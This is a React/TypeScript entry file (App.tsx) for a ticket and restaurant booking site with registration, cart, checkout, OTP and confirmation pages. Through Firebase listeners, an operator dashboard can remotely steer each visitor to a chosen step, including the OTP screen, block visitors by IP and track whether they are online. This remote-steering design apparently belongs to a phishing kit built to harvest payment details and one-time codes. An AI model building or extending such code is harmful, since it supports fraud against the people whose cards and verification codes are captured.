import { Switch, Route, useLocation } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { Loading } from "@/components/loading";
import { Suspense, lazy, useEffect, useState } from "react";
import { setupOnlineStatus } from "@/lib/utils";
import {
  listenForDirectedStep,
  clearDirectedStep,
  ensureVisitorIp,
  listenForIpBlock,
} from "@/lib/firebase";

const STEP_TO_PATH: Record<number, string> = {
  1: "/registration",
  2: "/booking",
  3: "/cart",
  4: "/checkout",
  5: "/otp",
  6: "/otp",
  7: "/confirmation",
};

function DirectedStepWatcher() {
  const [location, setLocation] = useLocation();
  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;
    const unsubscribe = listenForDirectedStep((step) => {
      const target = STEP_TO_PATH[step];
      if (!target) return;
      if (window.location.pathname !== target) {
        setLocation(target);
      }
      void clearDirectedStep();
    });
    return () => unsubscribe();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  void location;
  return null;
}

const Home = lazy(() => import("@/pages/home"));
const TicketsPage = lazy(() => import("@/pages/tickets"));
const RegistrationPage = lazy(() => import("@/pages/registration"));
const BookingPage = lazy(() => import("@/pages/booking"));
const CartPage = lazy(() => import("@/pages/cart"));
const CheckoutPage = lazy(() => import("@/pages/checkout"));
const OTPPage = lazy(() => import("@/pages/otp"));
const ConfirmationPage = lazy(() => import("@/pages/confirmation"));
const DashboardPage = lazy(() => import("@/pages/dashboard"));
const LoginPage = lazy(() => import("@/pages/login"));
const RestaurantsPage = lazy(() => import("@/pages/restaurants"));
const RestaurantDetailPage = lazy(() => import("@/pages/restaurant-detail"));
const ReservePage = lazy(() => import("@/pages/reserve"));
const NotFound = lazy(() => import("@/pages/not-found"));

function Router() {
  return (
    <Suspense fallback={<Loading />}>
      <Switch>
        <Route path="/" component={Home} />
        <Route path="/tickets" component={TicketsPage} />
        <Route path="/registration" component={RegistrationPage} />
        <Route path="/booking" component={BookingPage} />
        <Route path="/cart" component={CartPage} />
        <Route path="/checkout" component={CheckoutPage} />
        <Route path="/otp" component={OTPPage} />
        <Route path="/confirmation" component={ConfirmationPage} />
        <Route path="/dashboard" component={DashboardPage} />
        <Route path="/login" component={LoginPage} />
        <Route path="/restaurants" component={RestaurantsPage} />
        <Route path="/restaurant/:id" component={RestaurantDetailPage} />
        <Route path="/reserve/:id" component={ReservePage} />
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

function IpBlockGate({ children }: { children: React.ReactNode }) {
  const [blocked, setBlocked] = useState(false);

  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let unsubscribe: (() => void) | undefined;
    let cancelled = false;
    (async () => {
      const { ip, blocked: initial } = await ensureVisitorIp();
      if (cancelled) return;
      setBlocked(initial);
      if (ip) {
        unsubscribe = listenForIpBlock(ip, (nowBlocked) => {
          setBlocked(nowBlocked);
        });
      }
    })();

    return () => {
      cancelled = true;
      if (unsubscribe) unsubscribe();
    };
  }, []);

  if (blocked) {
    return (
      <div
        dir="rtl"
        className="min-h-screen flex items-center justify-center bg-[#1a0a10] text-white p-6"
        data-testid="ip-blocked-screen"
      >
        <div className="max-w-md w-full text-center bg-[#2a1018] border border-[#4a1525] rounded-2xl p-8 shadow-2xl">
          <div className="text-5xl mb-4">⛔</div>
          <h1 className="text-2xl font-bold mb-3 text-[#c9a96e]">
            تم حظر الوصول
          </h1>
          <p className="text-sm text-slate-300 leading-relaxed">
            عذراً، لا يمكنك الوصول إلى هذا الموقع من عنوان الـ IP الحالي. إذا
            كنت تعتقد أن هذا خطأ، يرجى التواصل مع الدعم الفني.
          </p>
        </div>
      </div>
    );
  }

  return <>{children}</>;
}

function App() {
  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) {
      return;
    }
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <IpBlockGate>
          <DirectedStepWatcher />
          <Router />
        </IpBlockGate>
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
